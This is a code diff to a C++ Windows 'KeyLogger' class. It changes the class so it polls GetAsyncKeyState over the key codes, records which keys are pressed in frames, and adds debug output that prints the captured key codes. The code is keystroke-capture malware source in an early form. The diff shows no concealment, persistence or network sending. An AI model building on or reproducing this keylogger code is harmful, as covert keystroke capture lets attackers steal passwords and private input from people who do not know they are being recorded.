@@ -24,19 +24,29 @@ inline VOID KeyLogger::pushFrame()
 	KeyFrame* frame = new KeyFrame();
 
 	SHORT o;
-	for (WORD i = 0; i < sizeof(WORD); ++i) {
+	for (WORD i = 0; i < 0xFF; ++i) {
 		o = GetAsyncKeyState(i);
 
-		if (o)
+		if (o & 0x8000)
 			frame->addKey(i);
 	}
 
-	keyframes.emplace_back(frame);//something here
+	keyframes.emplace_back(frame);
 }
 
 inline VOID KeyLogger::record()
 {
+#ifdef DEBUG
+	std::cout << "Recording...\n";
+#endif
 	this->pushFrame();
+}
+
+VOID KeyLogger::recordFrames(size_t frames)
+{
+	for (size_t i = 0; i < frames; ++i) {
+		this->record();
+	}
 }
 
 inline VOID KeyLogger::stoprecord()
@@ -44,9 +54,19 @@ inline VOID KeyLogger::stoprecord()
 	return VOID();
 }
 
-inline KeyLogger::~KeyLogger()
+#ifdef DEBUG
+VOID KeyLogger::printFrames() const{
+	for (size_t i = 0; i < keyframes.size(); ++i) {
+		std::cout << "Frame: " << (i + 1) << '\n';
+		keyframes[i]->printFrame();
+		std::cout << '\n';
+	}
+}
+#endif
+
+KeyLogger::~KeyLogger()
 {
-	for (KeyLogger* obj : keyframes)
+	for (KeyFrame* obj : keyframes)
 		delete obj;
 	keyframes.clear();
 }
@@ -55,3 +75,11 @@ inline VOID KeyFrame::addKey(WORD vKey)
 {
 	perframe.emplace_back(vKey);
 }
+
+#ifdef DEBUG
+inline VOID KeyFrame::printFrame() const{
+	for (size_t f = 0; f < perframe.size();++f) {
+		std::cout << "Hex code: " << std::hex << perframe[f] << '\n';
+	}
+}
+#endif
